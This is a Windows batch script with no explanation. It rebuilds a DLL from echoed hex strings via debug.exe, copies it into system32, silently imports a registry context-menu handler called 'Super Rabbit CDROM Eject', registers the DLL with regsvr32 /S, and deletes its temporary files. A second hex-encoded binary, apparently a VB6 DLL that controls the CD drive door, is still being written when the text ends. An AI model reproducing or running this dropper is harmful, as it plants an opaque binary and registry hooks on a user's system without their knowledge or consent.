@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF18000000FFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"2C000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0A00A69C4344524F4D456A65"_>>debug.vbs
@echo +"6374575700000000FFFFFFFF0638617E5F634D656E75575764000000FFFFFFFF05386595634D656E75575757000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0010000058020000023008300E3014301A30203026302C30323038303E3044304A30503056305C30623068306E3074307A30803086308C3092309A309F305031643168318031843188318C31903195319A31A131A631DC31F831FC31003234323C3244324C3254325C3264326C3274327C3284328C3294329C32A432AC32B432"_>>debug.vbs
@echo +"BC32D032D432EC32F032F432F832FC320033043308330C331033143318331C332033243328332C333033343338333C334033443348334D33523359335E3365336A33713376337D3382338C3394339833A033A433BC35C835D035DC35E035F835003608361036183620362C3630363C364036443648364C365036543658365C36"_>>debug.vbs
@echo +"6036643668366C367036743678367C368036843688368C369036943698369C36A036A436A836AC36B036B436B836BC36C036CC36DC36E436F436003704370C371C3728372C373437543758375C376037643768376C37703778377C378037843788378C379037B037B437B837BC37C037C437C837CC37DC37E037E437E837EC37"_>>debug.vbs
@echo +"F037FE3703381238173826382B383A383F384E3853386238673876387B388A388F3898389C38A838C438D438E838F038003908391839203928393039483950395839603978397C39803984398C399039103B243B283BA43BB43BB83BBC3B103D143D1C3D213D2C3D313D603D643D6C3D713D7C3D813DA43DA83DB03DB53DC03D"_>>debug.vbs
@echo +"C53DF83DFC3D043E093E143E193E4C3E503E583E5D3E683E6D3E8C3E903E983E9D3EA83EAD3ED43ED83EE03EE53EF03EF53E103F143F1C3F213F2C3F313F4C3F503F583F5D3F683F6D3F883F8C3F943F993FA43FA93F000000200000EC0000009C30A030A830AD30B830BD30EC30F030F830FD3008310D312C31303138313D31"_>>debug.vbs
@echo +"48314D316C31703178317D3188318D31A831AC31B431B931C431C931EC31F031F831FD3108320D3228322C32343239324432493230333433443348334C335033543358335C336033643368336C337033743378337C3380339C33A033BC33C033C433C833CC33D433D833F033143438345C348034A834C434F8340C3514351835"_>>debug.vbs
@echo +"1C3536353B3540354C3551355635623567356C357835CC354836F4367837A437C0376C38383988399439AC39B039B439B839BC39C039C439C839CC39683BB43C043E583F0030000014000000D030AC32A83400373837000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"">>debug.vbs
@echo with wscript.stdout:r=vbcrlf:for i=1 to len(str) step 48:.write "e"+hex(256+(i-1)/2):for j=i to i+46 step 2:.write " "+mid(str,j,2):next:.write r:next>>debug.vbs
@echo .write "rbx"+r+"0"+r+"rcx"+r+"4000"+r+"n debug.tmp"+r+"w"+r+"q"+r:end with>>debug.vbs&&cscript //nologo debug.vbs|debug.exe>nul&&ren debug.tmp "srcd.dll"&del debug.vbs
cls
copy srcd.dll %windir%\system32\
del /s /q srcd.dll

ECHO Windows Registry Editor Version 5.00>SHOWALL.reg

ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\Super Rabbit CDROM Eject]>>SHOWALL.reg
ECHO @="{F0479943-AA1D-49DD-86F4-6035E068260C}">>SHOWALL.reg

REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg

regsvr32 /S %windir%\system32\srcd.dll

@echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
@echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C01030083CFB3450000000000000000E0000F010B010600002000000020000000000000B811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
@echo +"040000000000000000500000001000008EDB0000020000000000100000100000000010000010000000000000100000000000000000000000641D00002800000000400000EC0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000280200002000000000100000A80000000000000000000000000000000000000000000000000000002E74657874000000B8100000001000000020000000100000000000000000000000000000200000602E64617461000000F8090000003000000010000000300000000000000000000000000000400000C0"_>>debug.vbs
@echo +"2E72737263000000EC08000000400000001000000040000000000000000000000000000040000040FC4521411000000000000000000000004D535642564D36302E444C4C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"44594773FCB148738D6948736E9849739E104973B0DB3B734E624873D568487324734673026248739A6248739A63487364B34873AF443B736FD83A73E6BB497378B73A738A69487385E33B7309B448737C6746735B4E3B731D6648734E6348737F9D4973A1B24873CE624873CE634873B0483B73026348733D5D48733EDE3973"_>>debug.vbs
@echo +"7795477336B83A733C14497336B148735E473B73EA204873BAB44873350F4873FE473B730000000007000800F91C4000211D4000001D40000000000000000000FF2534104000FF2554104000FF2560104000FF2528104000FF2524104000FF2568104000FF2518104000FF2578104000FF252C104000FF2574104000FF256C10"_>>debug.vbs
@echo +"4000FF255C104000FF2544104000FF2558104000FF251C104000FF2508104000FF258C104000FF2504104000FF259C104000FF2564104000FF2530104000FF254C104000FF2598104000FF2594104000FF2540104000FF2510104000FF2514104000FF2570104000FF2500104000FF2590104000FF253C104000FF25A0104000"_>>debug.vbs
@echo +"FF2588104000FF2520104000FF2584104000FF2580104000FF250C104000FF2550104000FF2538104000FF2548104000FF257C10400000006810134000E8EEFFFFFF00000000000030000000380000000000000074275E0D56BD5B498696073B7D2A549E00000000000001000000000000000000D7D3B3CCD0F2000000000000"_>>debug.vbs
@echo +"FFCC3100006DF84A00F2A1C248AE9BCF42A7F2CA71EED617FD144EBE4FB644EBA57E7535E13A4FAD339966CF11B70C00AA0060D393000000000000000000000000000000000000000000000000000000000000000000000000540000004F000000000500466F726D31000D010500466F726D310003050000800A011901004200"_>>debug.vbs
@echo +"220123FFFFFFFF240500466F726D31002600270028002E0035803400000924000094020000870000004100FF04000000070000001C19400007000000C4184000500000006DF84A00F2A1C248AE9BCF42A7F2CA710000000000000000000000000000000000000000100000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"AD00000000000000001240004C00000056423521F01F7662366368732E646C6C000000002A000000000000000000000000000A00040800000000000000000000F814400000F0300000FFFFFF080000000100000001000000E9000000C0124000B0124000C4114000780000008000000086000000870000000000000000000000"_>>debug.vbs
@echo +"0000000000000000636C6F7365636400B9A4B3CC310000D7D3B3CCD0F20000000100000034174000000000006C1B4000FFFFFFFF00000000881740000830400002000000181440000000000000000000000000001814400001000000E41740000000000020144000010000002814400000000000241440000100000028144000"_>>debug.vbs
@echo +"0100B70168006C0050144000F032400000000000346B1E00203D203120746865F41740000418400040001F003400000014184000FFFFFFFF000000000000000054144000D817200024184000FFFFFFFFF01440000000000028144000A01340009E114000A4114000AA1140000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00000000E8144000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000816C240433000000E9CB060000000000F401000034174000"_>>debug.vbs
@echo +"00000000B01B4000601D4000F009000008304000C6104000003040002A005C0041004B003A005C0058005000F3532E956962555CBE8B6E7F0759FD4E5C00505B0B7A8F5E5C00505B0B7A8F5E2E007600620070000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B012400002000000000000002C304000381B4000FFFFFFFF000000001C304000C686683188E74D4AA229F4D96EB0D9980A0001000100010088174000000000000000000000000000CC1740000904000004080000"_>>debug.vbs
@echo +"0000000002000000A0134000FFFFFFFF50194000000000000000000000000000C417400003000000B8174000FFFF000083800100000000000000000000000000B9010000466F726D31000000D7D3B3CCD0F20000EED617FD144EBE4FB644EBA57E7535E15E26AD8BCA07CC4DABC6E46DDB1EC3266DF84A00F2A1C248AE9BCF42"_>>debug.vbs
@echo +"A7F2CA718C03F3349B6A2245A8DDCC08DA716D293A4FAD339966CF11B70C00AA0060D393466F726D000000002E3DFBFCFAA06810A73808002B3371B5433A5C50726F6772616D2046696C65735C4D6963726F736F66742056697375616C2053747564696F5C564239385C5642362E4F4C42000000564200002C18400000000000"_>>debug.vbs
@echo +"06000000090000003C18400074184000D03240000000000000000000E03B1B000D00000061647661706933322E646C6C000000000C0000005265674F70656E4B65794100A4184000B818400000000400D43240000000000000000000A1DC3240000BC07402FFE068C4184000B850114000FFD0FFE00000000A00000077696E6D"_>>debug.vbs
@echo +"6D2E646C6C0000000F0000006D636953656E64537472696E67410000FC1840000C19400000000400E03240000000000000000000A1E83240000BC07402FFE0681C194000B850114000FFD0FFE00000000C0040000000000000000000980000002A005C007300680065006C006C00650078005C0043006F006E00740065007800"_>>debug.vbs
@echo +"74004D0065006E007500480061006E0064006C006500720073005C007B00300030003000300030003000300030002D006B0069006E0067002D006B0069006E0067002D0032003200300030002D003000300030003000300030003000300030003000300030007D005C0046006F006C006400650072005C00000000002E000000"_>>debug.vbs
@echo +"73006500740020004300440041007500640069006F00200064006F006F007200200063006C006F007300650064000000564241362E444C4C000000005F5F76626146726565566172000000005F5F766261456E64000000005F5F766261467265655374724C697374000000005F5F766261537472546F416E736900005F5F7662"_>>debug.vbs
@echo +"61537472493200005F5F7662615374724D6F7665000000005F5F76626156617254737445710000005F5F76626146726565537472000000005F5F766261566172436F7079000000005F5F76626153657453797374656D4572726F72005F5F766261493456617200005F5F7662615661724D6F7665000000006C1B400000000000"_>>debug.vbs
@echo +"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034174000FFFFFFFF00000000F81A4000000000000000000000000000FFFFFFFF000000007818400014184000EC32400000000000A0134000FFFFFFFF000000000C000000"_>>debug.vbs
@echo +"00000000FC1A400000000000081B4000F81A4000F81A40000000000000000000000000004000000004000000CCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC558BEC83EC0C68C610400064A100000000506489250000000083EC6C5356578965F4C745F8A81040008B45088BC883E101894DFC24FE508945088B10FF52048D"_>>debug.vbs
@echo +"45CC33F6508975DC8975CC8975C88975C48975C08975B08975A089759089758CFF15801040008B3D841040008D4D8C518D55C868601940005289458CFFD7506800000080E893FCFFFF8BD8FF15201040008B458C8D55A08D4DCC8945A8C745A003000000FF15881040008D55908D4DDC895D98C7459003000000FF150C104000"_>>debug.vbs
@echo +"8D4DC8FF15A01040008D4DDC8D55A051528975A8C745A002800000FF153C1040006685C0744A565656FF15001040008BD08D4DC4FF1590104000508D45C050FFD7508D4DC868001A400051FFD750E861FCFFFFFF15201040008D55C08D45C4528D4DC850516A03FF157010400083C410FF15141040008975FC68321D4000EB21"_>>debug.vbs
@echo +"8D55C08D45C4528D4DC850516A03FF157010400083C4108D4DB0FF1510104000C38B35101040008D4DDCFFD68D4DCCFFD6C38B4508508B10FF52088B45FC8B4DEC5F5E64890D000000005B8BE55DC204009090909090909090909090909090909E9E9E9E8C1D0000FFFFFFFFFFFFFFFF341E0000001000000000000000000000"_>>debug.vbs
@echo +"000000000000000000000000421E0000501E00005A1E0000681E0000781E0000881E0000941E0000A41E0000B21E0000C81E0000D81E0000EA1E0000FC1E0000061F0000141F0000281F0000381F00004A1F0000581F00006E1F0000781F0000941F0000AA1F0000B81F0000CA1F0000DE1F0000E81F0000FA1F00000C200000"_>>debug.vbs
@echo +"202000003220000064000080402000004E20000060200000702000007A2000008A200000942000009E200000A8200000000000004D535642564D36302E444C4C000000005F5F7662615374724932000000005F4349636F73000000005F61646A5F667074616E000000005F5F7662615661724D6F7665000000005F5F76626146"_>>debug.vbs
@echo +"726565566172000000005F5F766261456E64000000005F61646A5F666469765F6D36340000005F61646A5F667072656D310000005F5F76626153657453797374656D4572726F720000005F61646A5F666469765F6D33320000005F61646A5F666469765F6D313669000000005F61646A5F66646976725F6D3136690000005F43"_>>debug.vbs
@echo +"4973696E000000005F5F76626143686B73746B0000004556454E545F53494E4B5F4164645265660000005F5F7662615661725473744571000000446C6C46756E6374696F6E43616C6C0000005F61646A5F66706174616E0000004556454E545F53494E4B5F52656C65617365000000005F4349737172740000004556454E545F"_>>debug.vbs
@echo +"53494E4B5F5175657279496E746572666163650000005F5F76626145786365707448616E646C6572000000005F61646A5F667072656D000000005F61646A5F66646976725F6D3634000000005F5F7662614650457863657074696F6E000000005F43496C6F67000000005F61646A5F666469765F6D333269000000005F61646A"_>>debug.vbs
@echo +"5F66646976725F6D3332690000005F5F766261467265655374724C697374000000005F61646A5F66646976725F6D3332000000005F61646A5F666469765F720000005F5F7662614934566172000000005F5F766261537472546F416E7369000000005F5F766261566172436F7079000000005F43496174616E0000005F5F7662"_>>debug.vbs
@echo +"615374724D6F7665000000005F616C6C6D756C0000005F434974616E000000005F4349657870000000005F5F766261467265655374720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
